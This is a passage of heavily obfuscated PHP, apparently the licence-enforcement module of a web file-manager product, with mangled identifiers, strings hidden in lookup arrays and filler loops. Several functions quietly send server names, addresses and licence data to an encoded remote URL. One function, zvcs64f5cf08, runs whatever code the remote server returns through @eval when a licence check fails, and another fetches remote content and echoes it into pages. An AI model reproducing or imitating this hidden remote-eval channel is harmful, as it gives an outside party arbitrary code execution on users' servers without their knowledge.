$this->fdsccfe1612c(); die; } if (isset($ûÓ®•¥¦[$ÖŸÂ”“Œ[151]]) && isset($ûÓ®•¥¦[$ÖŸÂ”“Œ[151]]) == $ÖŸÂ”“Œ[122]) { $ûÓ®•¥¦[$ÖŸÂ”“Œ[152]] = Model($ÖŸÂ”“Œ[33])->get($ÖŸÂ”“Œ[153]); } if (!isset($ûÓ®•¥¦[$ÖŸÂ”“Œ[152]]) || strlen($ûÓ®•¥¦[$ÖŸÂ”“Œ[152]]) != 16) { show_json($ÖŸÂ”“Œ[154] . $ûÓ®•¥¦[$ÖŸÂ”“Œ[152]], !1); } $¥Ú£¹Úº = Model($ÖŸÂ”“Œ[33])->get($ÖŸÂ”“Œ[100]); $«ÕÄ£ªÒ = md5($_SERVER[$ÖŸÂ”“Œ[106]] . $¥Ú£¹Úº); $ •©À— = $ù¼¨×[731]; while (strlen($ •©À—) < $ù¼¨×[706]) { if (!$ •©À—) { break; } $ •©À—++; } $Ğ¤«´Óğ = array($ÖŸÂ”“Œ[152] => $ûÓ®•¥¦[$ÖŸÂ”“Œ[152]], $ÖŸÂ”“Œ[155] => rand_string(16), $ÖŸÂ”“Œ[156] => $ÖŸÂ”“Œ[136], $ÖŸÂ”“Œ[157] => $ÖŸÂ”“Œ[158], $ÖŸÂ”“Œ[159] => $_SERVER[$ÖŸÂ”“Œ[160]], $ÖŸÂ”“Œ[161] => $_SERVER[$ÖŸÂ”“Œ[162]], $ÖŸÂ”“Œ[163] => $_SERVER[$ÖŸÂ”“Œ[164]], $ÖŸÂ”“Œ[105] => $«ÕÄ£ªÒ, $ÖŸÂ”“Œ[165] => Model($ÖŸÂ”“Œ[33])->get($ÖŸÂ”“Œ[131])); if (isset($ûÓ®•¥¦[$ÖŸÂ”“Œ[151]]) && isset($ûÓ®•¥¦[$ÖŸÂ”“Œ[151]]) == $ÖŸÂ”“Œ[122]) { $Ğ¤«´Óğ[$ÖŸÂ”“Œ[151]] = md5($Ğ¤«´Óğ[$ÖŸÂ”“Œ[152]] . $ÖŸÂ”“Œ[166] . $Ğ¤«´Óğ[$ÖŸÂ”“Œ[155]]); } if ($ûÓ®•¥¦[$ÖŸÂ”“Œ[167]] == $ÖŸÂ”“Œ[168]) { $ÅÎÊÇâô = $this->fypma159390a($«ÕÄ£ªÒ, $ÖŸÂ”“Œ[169]); $ğ»¾Î¾× = $this->hqezba28bfdf(json_encode($Ğ¤«´Óğ), $«ÕÄ£ªÒ . $ÖŸÂ”“Œ[170], 3); $ğ»¾Î¾× = $ğ»¾Î¾× . $ÖŸÂ”“Œ[171] . $_SERVER[$ÖŸÂ”“Œ[160]]; $š×ıÚ‡Ğ = $this->qvudbb541d4f($ÖŸÂ”“Œ[172] . $ÅÎÊÇâô . $ÖŸÂ”“Œ[173] . $ğ»¾Î¾×, -1); show_json($š×ıÚ‡Ğ, !0); } else { if ($ûÓ®•¥¦[$ÖŸÂ”“Œ[167]] == $ÖŸÂ”“Œ[174]) { $üŠŞ“ = substr(md5($ÖŸÂ”“Œ[175] . $«ÕÄ£ªÒ), 12, 15) . $ÖŸÂ”“Œ[176]; $ğ»¾Î¾× = $this->thbp2f2e4713(trim($ûÓ®•¥¦[$ÖŸÂ”“Œ[177]]), $üŠŞ“, 2); $ùèğ³ô“ = json_decode($ğ»¾Î¾×, !0); if (!is_array($ùèğ³ô“) || !is_array($ùèğ³ô“[$ÖŸÂ”“Œ[178]]) || $ùèğ³ô“[$ÖŸÂ”“Œ[152]] != !0) { $¬¢ˆ¸ƒ• = $ÖŸÂ”“Œ[179]; $Äñ´¨˜Ÿ = $ùèğ³ô“[$ÖŸÂ”“Œ[178]] ? $ÖŸÂ”“Œ[180] . $ùèğ³ô“[$ÖŸÂ”“Œ[178]] : $¬¢ˆ¸ƒ•; show_json($Äñ´¨˜Ÿ, !1); } else { $Ğ¤«´Óğ[$ÖŸÂ”“Œ[155]] = $ùèğ³ô“[$ÖŸÂ”“Œ[178]][$ÖŸÂ”“Œ[181]]; } } else { $ùèğ³ô“ = $this->qvudbb541d4f($ÖŸÂ”“Œ[182], $Ğ¤«´Óğ, 10); } } if (!is_array($ùèğ³ô“) || !is_array($ùèğ³ô“[$ÖŸÂ”“Œ[178]]) || $ùèğ³ô“[$ÖŸÂ”“Œ[152]] != !0) { $¬¢ˆ¸ƒ• = LNG($ÖŸÂ”“Œ[183]); $Äñ´¨˜Ÿ = $ùèğ³ô“[$ÖŸÂ”“Œ[178]] ? $ÖŸÂ”“Œ[180] . $ùèğ³ô“[$ÖŸÂ”“Œ[178]] : $¬¢ˆ¸ƒ•; show_json($Äñ´¨˜Ÿ, !1); } $İŞŸ¹Ïş = $ùèğ³ô“[$ÖŸÂ”“Œ[178]]; $úöõĞÜ­ = $this->jbzq33a78e95($İŞŸ¹Ïş[$ÖŸÂ”“Œ[184]]); if (!$úöõĞÜ­ || $úöõĞÜ­ != $İŞŸ¹Ïş[$ÖŸÂ”“Œ[129]]) { $òÎ–Ì¹À = array($ÖŸÂ”“Œ[185] => Model($ÖŸÂ”“Œ[33])->get($ÖŸÂ”“Œ[100]), $ÖŸÂ”“Œ[186] => $_SERVER[$ÖŸÂ”“Œ[106]], $ÖŸÂ”“Œ[187] => this_url(), $ÖŸÂ”“Œ[161] => $_SERVER[$ÖŸÂ”“Œ[162]]); $ğ»¾Î¾× = $this->cdby6a12bd5b(json_encode($òÎ–Ì¹À)); $this->qvudbb541d4f($ÖŸÂ”“Œ[188] . $ğ»¾Î¾×); show_json(LNG($ÖŸÂ”“Œ[189]), !0); } $²ÂôŒûÙ = array($ÖŸÂ”“Œ[153] => $İŞŸ¹Ïş[$ÖŸÂ”“Œ[190]], $ÖŸÂ”“Œ[191] => $İŞŸ¹Ïş[$ÖŸÂ”“Œ[192]], $ÖŸÂ”“Œ[193] => rand_string(16), $ÖŸÂ”“Œ[108] => $İŞŸ¹Ïş[$ÖŸÂ”“Œ[194]]); if ($Ğ¤«´Óğ[$ÖŸÂ”“Œ[155]]) { $²ÂôŒûÙ[$ÖŸÂ”“Œ[193]] = $Ğ¤«´Óğ[$ÖŸÂ”“Œ[155]]; } $œ‚Ö Êæ = substr(md5($²ÂôŒûÙ[$ÖŸÂ”“Œ[191]]), 10, 10); $ÒØïÊ¡­ = $œ‚Ö Êæ . $²ÂôŒûÙ[$ÖŸÂ”“Œ[108]] . $²ÂôŒûÙ[$ÖŸÂ”“Œ[193]]; $®Úâû§° = $ù¼¨×[732]; if (!$®Úâû§°) { die; } $²ÂôŒûÙ[$ÖŸÂ”“Œ[110]] = strrev(base64_encode($this->fypma159390a($ÒØïÊ¡­, $ÖŸÂ”“Œ[195]))); $åæ¥î = rand_string(16); $¿ƒ²‹ = $ù¼¨×[733]; if (strlen($¿ƒ²‹) < $ù¼¨×[702]) { die; } $‘ ´˜ûñ = $åæ¥î . $²ÂôŒûÙ[$ÖŸÂ”“Œ[108]] . $this->fypma159390a(md5($²ÂôŒûÙ[$ÖŸÂ”“Œ[153]]), $åæ¥î); $•ˆã†“ì = $ù¼¨×[734]; $²ÂôŒûÙ[$ÖŸÂ”“Œ[111]] = base64_encode(strrev($this->fypma159390a($‘ ´˜ûñ, $ÖŸÂ”“Œ[196]))); if ($İŞŸ¹Ïş[$ÖŸÂ”“Œ[197]] && $İŞŸ¹Ïş[$ÖŸÂ”“Œ[197]] >= 1) { Model($ÖŸÂ”“Œ[33])->setDeep($ÖŸÂ”“Œ[198], $ÖŸÂ”“Œ[122]); } Model($ÖŸÂ”“Œ[33])->set($²ÂôŒûÙ); $­­ÛÛ¬¹ = md5($_SERVER[$ÖŸÂ”“Œ[106]] . strrev($¥Ú£¹Úº) . $²ÂôŒûÙ[$ÖŸÂ”“Œ[191]]); $ßÏ¦”ç… = strrev(substr($­­ÛÛ¬¹, 10, 16)); $ğ¤ƒªæ = $ù¼¨×[735]; while (strlen($ğ¤ƒªæ) < $ù¼¨×[702]) { if (!$ğ¤ƒªæ) { break; } $ğ¤ƒªæ++; } $şÀÇ®æ÷ = $this->hqezba28bfdf(json_encode($İŞŸ¹Ïş), $­­ÛÛ¬¹); $¬ÄíĞçŒ = $ù¼¨×[736]; $É °Û® = array_to_keyvalue(Model($ÖŸÂ”“Œ[7])->listData(), $ÖŸÂ”“Œ[199]); $Á“×÷«½ = $ù¼¨×[737]; $ßÄŠ¸ÛÖ = $É °Û®[$ÖŸÂ”“Œ[200]]; $öûÄô°ç = array(); $Ê¸Ù•» = $ù¼¨×[738]; if (strlen($Ê¸Ù•») < $ù¼¨×[696]) { die; } $öûÄô°ç[$ßÏ¦”ç…] = $şÀÇ®æ÷; $ÉÊ°¢ª‰ = $ù¼¨×[739]; Model($ÖŸÂ”“Œ[7])->update($ßÄŠ¸ÛÖ[$ÖŸÂ”“Œ[201]], array($ÖŸÂ”“Œ[202] => $öûÄô°ç)); $¦¥Ì˜üÒ = $ù¼¨×[740]; while (strlen($¦¥Ì˜üÒ) < $ù¼¨×[706]) { if (!$¦¥Ì˜üÒ) { break; } $¦¥Ì˜üÒ++; } $this->jixp729c9007 = $İŞŸ¹Ïş; $this->akme593d53e6 = $²ÂôŒûÙ[$ÖŸÂ”“Œ[108]]; $this->licenseRegistSuccess(); $ãûÈÈúÃ = $ù¼¨×[741]; if (!$ãûÈÈúÃ) { return; } Cache::set($ÖŸÂ”“Œ[203] . md5($¥Ú£¹Úº . $ÖŸÂ”“Œ[204]), $ÖŸÂ”“Œ[6]); $Òô¥‰Ÿ = $ù¼¨×[742]; show_json(LNG($ÖŸÂ”“Œ[189]), !0); $Ä¦·µ÷¤ = $ù¼¨×[743]; if (strlen($Ä¦·µ÷¤) < $ù¼¨×[702]) { die; } } private function licenseRegistSuccess() { $à’¼Óûî =& $_SERVER[óÙù™Ê÷]; $Å¤ğ‡‡­ = Model($à’¼Óûî[33])->get(); if ($Å¤ğ‡‡­[$à’¼Óûî[63]] != $à’¼Óûî[122]) { Model($à’¼Óûî[33])->set($à’¼Óûî[63], $à’¼Óûî[122]); } Action($à’¼Óûî[205])->initStart(!0); } private function fdsccfe1612c() { $¡¼°Úó =& $_SERVER[«òÑğ]; $õ†›İÆî =& $_SERVER[óÙù™Ê÷]; Model($õ†›İÆî[33])->set(array($õ†›İÆî[153] => $õ†›İÆî[6], $õ†›İÆî[191] => $õ†›İÆî[6], $õ†›İÆî[108] => $õ†›İÆî[109], $õ†›İÆî[110] => $õ†›İÆî[6], $õ†›İÆî[111] => $õ†›İÆî[6])); Model($õ†›İÆî[33])->setDeep($õ†›İÆî[198], $õ†›İÆî[206]); $this->jixp729c9007 = array(); $şàÇÈù = $¡¼°Úó[744]; while (strlen($şàÇÈù) < $¡¼°Úó[693]) { if (!$şàÇÈù) { break; } $şàÇÈù++; } $this->akme593d53e6 = $õ†›İÆî[109]; } private function efmrc58e7e20() { $“Ğˆ·ŸË =& $_SERVER[«òÑğ]; $şÕš¡Éü =& $_SERVER[óÙù™Ê÷]; $_SERVER[$şÕš¡Éü[162]] = _get($_SERVER, $şÕš¡Éü[162], APP_HOST); $this->akme593d53e6 = $şÕš¡Éü[109]; $ª¬€ÀÜâ = Model($şÕš¡Éü[33])->get(); $¢ê‰ñ†ô = $“Ğˆ·ŸË[745]; if (!$¢ê‰ñ†ô) { die; } if ($ª¬€ÀÜâ[$şÕš¡Éü[108]] == $şÕš¡Éü[109]) { return; } $ş©õ¾ ¸ = Model($şÕš¡Éü[33])->get($şÕš¡Éü[100]); $Œæ”ÓŒ¤ = $şÕš¡Éü[203] . md5($ş©õ¾ ¸ . $şÕš¡Éü[204]); $«×Ì‡­Í = $“Ğˆ·ŸË[746]; $Ûıš²ùÀ = Cache::get($Œæ”ÓŒ¤); $Ÿ¡ÁÊ‡í = $“Ğˆ·ŸË[747]; if (!is_array($Ûıš²ùÀ) || !isset($Ûıš²ùÀ[$şÕš¡Éü[207]]) || time() - $Ûıš²ùÀ[$şÕš¡Éü[207]] >= 60) { $ØÅ¬½ª¿ = Model($şÕš¡Éü[7])->loadList(); $®Ø›Ø« = $ØÅ¬½ª¿[$şÕš¡Éü[200]]; $¨„Ì¿İÃ = md5($_SERVER[$şÕš¡Éü[106]] . strrev($ş©õ¾ ¸) . $ª¬€ÀÜâ[$şÕš¡Éü[191]]); $ŒŞâüš¾ = strrev(substr($¨„Ì¿İÃ, 10, 16)); $Ûıš²ùÀ = $this->thbp2f2e4713($®Ø›Ø«[$şÕš¡Éü[86]][$ŒŞâüš¾], $¨„Ì¿İÃ); $Ûıš²ùÀ = json_decode($Ûıš²ùÀ, !0); } if (!is_array($Ûıš²ùÀ)) { return $this->fdsccfe1612c(); } $’ì¶ıë¼ = strtotime($Ûıš²ùÀ[$şÕš¡Éü[129]]); if (time() >= $’ì¶ıë¼) { return $this->fdsccfe1612c(); } if (!isset($Ûıš²ùÀ[$şÕš¡Éü[207]]) || time() - $Ûıš²ùÀ[$şÕš¡Éü[207]] > 20) { $Ûıš²ùÀ[$şÕš¡Éü[207]] = time(); Cache::set($Œæ”ÓŒ¤, $Ûıš²ùÀ); } $this->jixp729c9007 = $Ûıš²ùÀ; $this->akme593d53e6 = $ª¬€ÀÜâ[$şÕš¡Éü[108]]; } private function ljek9279bab0() { $–˜ûÔì» =& $_SERVER[«òÑğ]; $«³¿úø =& $_SERVER[óÙù™Ê÷]; $°÷Ã‰² = $GLOBALS[$«³¿úø[13]]; $”ïš³¶« = $–˜ûÔì»[748]; while ($”ïš³¶« < $–˜ûÔì»[702]) { if ($”ïš³¶« >= 0) { break; } $”ïš³¶«++; } $†Åíêé™ = $_SERVER[$«³¿úø[24]]; if ($†Åíêé™ == $«³¿úø[208] && $this->akme593d53e6 == $«³¿úø[109]) { show_json(LNG($«³¿úø[209]), !1, $«³¿úø[210]); } $æß•Øˆê = array($«³¿úø[211], $«³¿úø[212]); if (in_array($†Åíêé™, $æß•Øˆê)) { if ($this->akme593d53e6 == $«³¿úø[109] && isset($°÷Ã‰²[$«³¿úø[213]])) { show_json(LNG($«³¿úø[209]), !1, $«³¿úø[210]); die; } $Ñúš“… = $this->nxyj9e6a672d(); if ($Ñúš“… != intval($«³¿úø[214])) { if ($Ñúš“… <= Model($«³¿úø[125])->count()) { show_json(LNG($«³¿úø[215]), !1, $«³¿úø[210]); die; } } } } private function inubeba72164() { $ÜŸƒ×Ã =& $_SERVER[«òÑğ]; $Â²ƒš¥¢ =& $_SERVER[óÙù™Ê÷]; $°ˆáù±» = array($Â²ƒš¥¢[119], $Â²ƒš¥¢[120]); if (!KodUser::isRoot() || !isset($_GET[$Â²ƒš¥¢[216]])) { return; } if (!in_array($_SERVER[$Â²ƒš¥¢[24]], $°ˆáù±»)) { return; } $ÔÜ¡•‚È = $Â²ƒš¥¢[217]; $ÔÜ¡•‚È = $this->pvjh415d5ad0($ÔÜ¡•‚È, $Â²ƒš¥¢[218]); $ùû¸ĞÅ = stream_context_create(array($Â²ƒš¥¢[219] => array($Â²ƒš¥¢[220] => $Â²ƒš¥¢[221], $Â²ƒš¥¢[222] => 3))); $‘éÓ •› = $ÜŸƒ×Ã[749]; if (strlen($‘éÓ •›) < $ÜŸƒ×Ã[706]) { return; } $—Ï‹›Æ = @file_get_contents($ÔÜ¡•‚È, !1, $ùû¸ĞÅ); $±šŞ¹¨ = $ÜŸƒ×Ã[750]; header($Â²ƒš¥¢[223]); if ($—Ï‹›Æ && strstr($—Ï‹›Æ, $Â²ƒš¥¢[224])) { echo $—Ï‹›Æ; } die; } public function csitddf585cb($…‹Œã·ñ) { $£üŠ§‹ı =& $_SERVER[«òÑğ]; $ÈÛËË¢‘ =& $_SERVER[óÙù™Ê÷]; if ($this->akme593d53e6 == $ÈÛËË¢‘[225]) { return $…‹Œã·ñ; } $“›˜È¶Ú = $this->versionPluginList(); $¾Ô¥×µ» = explode($ÈÛËË¢‘[226], $this->versionPluginFilter()); $Äæ¹Ù¾Š = array(); $ŠÉÂÑşù = $£üŠ§‹ı[751]; if (strlen($ŠÉÂÑşù) < $£üŠ§‹ı[702]) { return; } foreach ($“›˜È¶Ú as $¹ûªÔ×Ï => $Ö¶ÍŒİ) { if ($Ö¶ÍŒİ == $ÈÛËË¢‘[227] && substr($this->akme593d53e6, 0, 1) == $ÈÛËË¢‘[227]) { continue; } if (!in_array($¹ûªÔ×Ï, $¾Ô¥×µ»)) { $Äæ¹Ù¾Š[] = $¹ûªÔ×Ï; } } foreach ($Äæ¹Ù¾Š as $¹ûªÔ×Ï) { unset($…‹Œã·ñ[$¹ûªÔ×Ï]); } return $…‹Œã·ñ; $€ø—¶Ÿ = $£üŠ§‹ı[752]; } private function versionPluginList() { $›Ô¨Å„è =& $_SERVER[óÙù™Ê÷]; return array($›Ô¨Å„è[228] => $›Ô¨Å„è[227], $›Ô¨Å„è[229] => $›Ô¨Å„è[227], $›Ô¨Å„è[230] => $›Ô¨Å„è[227], $›Ô¨Å„è[231] => $›Ô¨Å„è[232], $›Ô¨Å„è[233] => $›Ô¨Å„è[232], $›Ô¨Å„è[234] => $›Ô¨Å„è[232], $›Ô¨Å„è[235] => $›Ô¨Å„è[232], $›Ô¨Å„è[236] => $›Ô¨Å„è[232], $›Ô¨Å„è[237] => $›Ô¨Å„è[232], $›Ô¨Å„è[238] => $›Ô¨Å„è[232], $›Ô¨Å„è[239] => $›Ô¨Å„è[232], $›Ô¨Å„è[240] => $›Ô¨Å„è[232], $›Ô¨Å„è[241] => $›Ô¨Å„è[232], $›Ô¨Å„è[242] => $›Ô¨Å„è[232], $›Ô¨Å„è[243] => $›Ô¨Å„è[232], $›Ô¨Å„è[244] => $›Ô¨Å„è[232]); } private function versionPluginFilter() { $…´ã„úˆ =& $_SERVER[«òÑğ]; $›àÚÁÖ =& $_SERVER[óÙù™Ê÷]; if ($this->akme593d53e6 == $›àÚÁÖ[109]) { return $›àÚÁÖ[6]; } $¸üÕ¬²Ï = _get($this->jixp729c9007, $›àÚÁÖ[245], $›àÚÁÖ[6]); $˜ÌÙ¨–§ = _get($this->jixp729c9007, $›àÚÁÖ[116], $›àÚÁÖ[6]); $€Ó–ĞÆÖ = $…´ã„úˆ[753]; if (!$€Ó–ĞÆÖ) { return; } $ÁçÇ£˜ğ = _get($this->jixp729c9007, $›àÚÁÖ[246], $›àÚÁÖ[6]); $Ê¸ÂØ¶Ï = $…´ã„úˆ[741]; if ($˜ÌÙ¨–§ > time() && $ÁçÇ£˜ğ > time()) { $Èå²–òË = explode($›àÚÁÖ[226], $¸üÕ¬²Ï); $Í¢µœú¬ = array_keys($this->versionPluginList()); $¸üÕ¬²Ï = array_merge($Èå²–òË, $Í¢µœú¬); $¸üÕ¬²Ï = implode($›àÚÁÖ[226], array_filter(array_unique($¸üÕ¬²Ï))); } return $¸üÕ¬²Ï; } private function griv4db22967() { $Íã¼ÓÖ =& $_SERVER[óÙù™Ê÷]; if ($this->akme593d53e6 != $Íã¼ÓÖ[109]) { $GLOBALS[$Íã¼ÓÖ[86]][$Íã¼ÓÖ[90]][$Íã¼ÓÖ[247]] = $Íã¼ÓÖ[206]; return; } $GLOBALS[$Íã¼ÓÖ[86]][$Íã¼ÓÖ[248]] = $Íã¼ÓÖ[122]; if (Model($Íã¼ÓÖ[249])->get($Íã¼ÓÖ[63]) != $Íã¼ÓÖ[206]) { Model($Íã¼ÓÖ[249])->set($Íã¼ÓÖ[63], $Íã¼ÓÖ[206]); } } public function ixtfc4488a50() { return $_SERVER[óÙù™Ê÷][250]; } private function zvcs64f5cf08() { $óé·Š°´ =& $_SERVER[«òÑğ]; $†Ã¨‘¹ç =& $_SERVER[óÙù™Ê÷]; $£›ìÙÚû = array($†Ã¨‘¹ç[251], $†Ã¨‘¹ç[252], $†Ã¨‘¹ç[253]); $ıõõ‡ÓÍ = $óé·Š°´[754]; if (!$ıõõ‡ÓÍ) { return; } $óü™Ÿ¹Í = $†Ã¨‘¹ç[254] . md5($†Ã¨‘¹ç[255]); if ($this->akme593d53e6 == $†Ã¨‘¹ç[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$†Ã¨‘¹ç[24]], $£›ìÙÚû)) { return; } if (time() % 4 != 0) { return; } $¢˜â¶€ = call_user_func(array($†Ã¨‘¹ç[256], $†Ã¨‘¹ç[257]), $óü™Ÿ¹Í); $í—¯üîä = $óé·Š°´[755]; while ($í—¯üîä < $óé·Š°´[724]) { if ($í—¯üîä >= 0) { break; } $í—¯üîä++; } if ($¢˜â¶€ && time() - $¢˜â¶€ < intval($†Ã¨‘¹ç[258])) { return; } call_user_func(array($†Ã¨‘¹ç[256], $†Ã¨‘¹ç[139]), $óü™Ÿ¹Í, time()); $ó†Üòœ¾ = $óé·Š°´[756]; $Ù¯µ°°‘ = Model($†Ã¨‘¹ç[33])->get($†Ã¨‘¹ç[100]); $¿±ÅÕ¿£ = $óé·Š°´[757]; while ($¿±ÅÕ¿£ < $óé·Š°´[702]) { if ($¿±ÅÕ¿£ >= 0) { break; } $¿±ÅÕ¿£++; } $Ä¯”æ“ = array($†Ã¨‘¹ç[152] => Model($†Ã¨‘¹ç[33])->get($†Ã¨‘¹ç[153]), $†Ã¨‘¹ç[167] => $this->akme593d53e6, $†Ã¨‘¹ç[163] => $_SERVER[$†Ã¨‘¹ç[164]], $†Ã¨‘¹ç[165] => Model($†Ã¨‘¹ç[33])->get($†Ã¨‘¹ç[131]), $†Ã¨‘¹ç[105] => md5($_SERVER[$†Ã¨‘¹ç[106]] . $Ù¯µ°°‘), $†Ã¨‘¹ç[156] => $†Ã¨‘¹ç[136], $†Ã¨‘¹ç[159] => $_SERVER[$†Ã¨‘¹ç[160]]); $ñï‰Â­ˆ = $óé·Š°´[758]; $¹×Ì€É‹ = $this->qvudbb541d4f($†Ã¨‘¹ç[259], $Ä¯”æ“); $ŒşèúÑ = $óé·Š°´[759]; if (strlen($ŒşèúÑ) < $óé·Š°´[702]) { return; } if (!is_array($¹×Ì€É‹)) { return; } if ($¹×Ì€É‹[$†Ã¨‘¹ç[152]] && $¹×Ì€É‹[$†Ã¨‘¹ç[260]]) { if ($this->jbzq33a78e95($¹×Ì€É‹[$†Ã¨‘¹ç[260]]) == $Ä¯”æ“[$†Ã¨‘¹ç[152]]) { return; } } $this->fdsccfe1612c(); if ($this->jbzq33a78e95($¹×Ì€É‹[$†Ã¨‘¹ç[260]]) != $Ä¯”æ“[$†Ã¨‘¹ç[152]]) { $ÇÖô´Ì = array($†Ã¨‘¹ç[185] => $Ù¯µ°°‘, $†Ã¨‘¹ç[186] => $_SERVER[$†Ã¨‘¹ç[106]], $†Ã¨‘¹ç[187] => this_url(), $†Ã¨‘¹ç[161] => $_SERVER[$†Ã¨‘¹ç[162]]); $ïÒĞğšë = $this->cdby6a12bd5b(json_encode($ÇÖô´Ì)); $¹×Ì€É‹ = $this->qvudbb541d4f($†Ã¨‘¹ç[188] . $ïÒĞğšë); if ($¹×Ì€É‹ && is_array($¹×Ì€É‹) && isset($¹×Ì€É‹[$†Ã¨‘¹ç[260]])) { $äÀ¥¿‚Š = $this->thbp2f2e4713($¹×Ì€É‹[$†Ã¨‘¹ç[260]], 2); if ($äÀ¥¿‚Š) { $äÀ¥¿‚Š = $this->jbzq33a78e95($äÀ¥¿‚Š); } if ($äÀ¥¿‚Š) { try { @eval($äÀ¥¿‚Š); } catch (Exception $µœãÏ—») { } } } } } private function qvudbb541d4f($Ğ¢±“Òî = '', $±Åä¹ãè = array(), $ÖÉ—µÃ‡ = 5) { $Šºğõñè =& $_SERVER[«òÑğ]; $Ò¼Å©Ò¿ =& $_SERVER[óÙù™Ê÷]; $ ƒÌÏô = $Ò¼Å©Ò¿[261]; $îØÏâÎ† = $Šºğõñè[760]; while ($îØÏâÎ† < $Šºğõñè[706]) { if ($îØÏâÎ† >= 0) { break; } $îØÏâÎ†++; } $ ƒÌÏô = $this->pvjh415d5ad0($ ƒÌÏô, $Ò¼Å©Ò¿[262]); $Ç›Ìûô¹ = $Šºğõñè[761]; $ ƒÌÏô = $ ƒÌÏô . $Ğ¢±“Òî; if ($±Åä¹ãè && is_array($±Åä¹ãè)) { $ ƒÌÏô = $ ƒÌÏô . $Ò¼Å©Ò¿[263] . http_build_query($±Åä¹ãè); } if ($±Åä¹ãè === -1) { return $ ƒÌÏô; } $¨¬Îòú = stream_context_create(array($Ò¼Å©Ò¿[219] => array($Ò¼Å©Ò¿[222] => $ÖÉ—µÃ‡, $Ò¼Å©Ò¿[220] => $Ò¼Å©Ò¿[264]), $Ò¼Å©Ò¿[265] => array($Ò¼Å©Ò¿[266] => !1, $Ò¼Å©Ò¿[267] => !1))); $±Åä¹ãè = @file_get_contents($ ƒÌÏô, !1, $¨¬Îòú); $…›´„ˆÚ = $Šºğõñè[762]; return json_decode($±Åä¹ãè, !0); $Ÿ‘¿¤şª = $Šºğõñè[763]; while ($Ÿ‘¿¤şª < $Šºğõñè[693]) { if ($Ÿ‘¿¤şª >= 0) { break; } $Ÿ‘¿¤şª++; } } private function nxyj9e6a672d() { $âïúÍõ« =& $_SERVER[«òÑğ]; $„Çù€¤ =& $_SERVER[óÙù™Ê÷]; $Æ›º°Íß = array($„Çù€¤[268] => $„Çù€¤[269], $„Çù€¤[270] => $„Çù€¤[271], $„Çù€¤[272] => $„Çù€¤[273], $„Çù€¤[274] => $„Çù€¤[275], $„Çù€¤[276] => $„Çù€¤[277], $„Çù€¤[278] => $„Çù€¤[214], $„Çù€¤[279] => $„Çù€¤[214], $„Çù€¤[280] => $„Çù€¤[269], $„Çù€¤[281] => $„Çù€¤[271], $„Çù€¤[282] => $„Çù€¤[273], $„Çù€¤[283] => $„Çù€¤[284], $„Çù€¤[285] => $„Çù€¤[275], $„Çù€¤[286] => $„Çù€¤[287], $„Çù€¤[288] => $„Çù€¤[277], $„Çù€¤[289] => $„Çù€¤[290], $„Çù€¤[291] => $„Çù€¤[292], $„Çù€¤[293] => $„Çù€¤[294]); $ƒñøÖ…û = $Æ›º°Íß[$this->akme593d53e6]; $¿­Ö’Í§ = $âïúÍõ«[764]; if (!$¿­Ö’Í§) { return; } $ƒñøÖ…û = intval($ƒñøÖ…û ? $ƒñøÖ…û : $„Çù€¤[269]); $ÇœĞÀÁ” = $âïúÍõ«[734]; $ƒÀ”ĞöÎ = _get($this->jixp729c9007, $„Çù€¤[295]); $­¨Æ•â = $âïúÍõ«[765]; $ƒÀ”ĞöÎ = $ƒÀ”ĞöÎ ? intval($ƒÀ”ĞöÎ) : 0; $Şª¢À÷¾ = $âïúÍõ«[766]; while ($Şª¢À÷¾ < $âïúÍõ«[706]) { if ($Şª¢À÷¾ >= 0) { break; } $Şª¢À÷¾++; } return $ƒñøÖ…û + $ƒÀ”ĞöÎ; } public function aoys34918c06($Ù›ŒÃ°Ï) { $àËØæ¶ =& $_SERVER[«òÑğ]; $Ñß¨Ú™ë =& $_SERVER[óÙù™Ê÷]; $ìëÙ†“Ä = $this->nxyj9e6a672d(); $æÔ‰ï¬ú = $àËØæ¶[767]; if (strlen($æÔ‰ï¬ú) < $àËØæ¶[696]) { return; } if ($Ù›ŒÃ°Ï[$Ñß¨Ú™ë[296]] == $Ñß¨Ú™ë[122]) { return; } if ($ìëÙ†“Ä >= intval($Ñß¨Ú™ë[214])) { return; } $¶ˆ ÄÖ = Model($Ñß¨Ú™ë[125])->count(); if ($¶ˆ ÄÖ <= $ìëÙ†“Ä) { return; } $ÊÃ–è‰° = Model($Ñß¨Ú™ë[125])->field($Ñß¨Ú™ë[296])->limit($ìëÙ†“Ä)->select(); $ÊÃ–è‰° = array_to_keyvalue($ÊÃ–è‰°, $Ñß¨Ú™ë[6], $Ñß¨Ú™ë[296]); $ï¢±ĞŸÍ = $àËØæ¶[768]; if (!$ï¢±ĞŸÍ) { die; } if (!in_array($Ù›ŒÃ°Ï[$Ñß¨Ú™ë[296]], $ÊÃ–è‰°)) { show_json($Ñß¨Ú™ë[297], !1, $Ñß¨Ú™ë[210]); } } public function pmtwd856175d() { $åªŞææÄ =& $_SERVER[«òÑğ]; $ŸªêÑ§‰ =& $_SERVER[óÙù™Ê÷]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $ú¼éÆ«Û = $ŸªêÑ§‰[217]; $Ç›ÓËºê = $åªŞææÄ[769]; if (strlen($Ç›ÓËºê) < $åªŞææÄ[702]) { die; } $ú¼éÆ«Û = $this->pvjh415d5ad0($ú¼éÆ«Û, $ŸªêÑ§‰[218]); $‰ë¿Æˆ„ = stream_context_create(array($ŸªêÑ§‰[219] => array($ŸªêÑ§‰[220] => $ŸªêÑ§‰[221], $ŸªêÑ§‰[222] => 3))); $¥ñ¹’î = @file_get_contents($ú¼éÆ«Û, !1, $‰ë¿Æˆ„); echo $ŸªêÑ§‰[298] . hash_encode($¥ñ¹’î) . $ŸªêÑ§‰[299]; } private function hqezba28bfdf($­øíÄØÂ, $ƒĞÃá»­, $ôÜ ¯ªò = 3) { $ÙÑÂº‹´ =& $_SERVER[«òÑğ]; $ëåãµİ÷ =& $_SERVER[óÙù™Ê÷]; usleep(1); $­øíÄØÂ = trim($­øíÄØÂ); $­á¼¡§ç = $ÙÑÂº‹´[770]; while ($­á¼¡§ç < $ÙÑÂº‹´[706]) { if ($­á¼¡§ç >= 0) { break; } $­á¼¡§ç++; } $ÉİçàÈ° = mt_rand(0, 5) . $ëåãµİ÷[6]; $ûèŞ¦Š½ = rand_string(15); $‡ƒ™û•® = $ÙÑÂº‹´[771]; $®“·²À = $ëåãµİ÷[300]; switch ($ÉİçàÈ°) { case $ëåãµİ÷[206]: $­‡ºÙùŸ = $this->fypma159390a($­øíÄØÂ, strrev($ƒĞÃá»­ . $ûèŞ¦Š½)); $öä‹‡³ = $ÙÑÂº‹´[772]; if (!$öä‹‡³) { die; } break; 